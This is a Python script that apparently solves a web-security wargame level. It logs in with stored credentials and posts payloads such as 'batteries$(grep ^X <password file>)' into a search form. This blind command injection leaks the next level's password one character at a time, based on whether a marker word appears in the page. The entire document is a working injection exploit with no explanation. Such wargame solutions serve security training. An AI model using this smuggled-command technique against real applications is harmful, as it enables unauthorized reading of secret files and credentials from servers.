#!/usr/bin/env python3

import requests
import base64
import re
from levels_credentials import credentials, folder

level_url = credentials[16]["url"]
level_username = credentials[16]["level"]
level_password = credentials[16]["password"]

next_level_url = credentials[17]["url"]
next_level_username = credentials[17]["level"]
next_password_file = folder + next_level_username

credentials = "%s:%s" % (level_username, level_password)
auth_creds = base64.b64encode(credentials.encode("ascii"))
heads = {"Authorization": "Basic %s" % auth_creds.decode("ascii"), "Referer": next_level_url}

alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
next_pass = ""

for i in alphabet:
    payload = "batteries$(grep ^%s %s)" % (i, next_password_file)
    post_data = {"needle":payload, "submit":"Search"}
    response = requests.post(level_url, headers=heads, data=post_data)
    data = response.text

    if "batteries" not in data:
        next_pass += i
        print(next_pass)
        break

j = 0
while len(next_pass) < 32:
    payload = "batteries$(grep ^%s%s %s)" % (next_pass, alphabet[j], next_password_file)
    post_data = {"needle":payload, "submit":"Search"}
    response = requests.post(level_url, headers=heads, data=post_data)
    data = response.text

    if "batteries" in data:
        j += 1

    elif "batteries" not in data:
        next_pass += alphabet[j]
        print(next_pass)
        j = 0

print(next_pass)
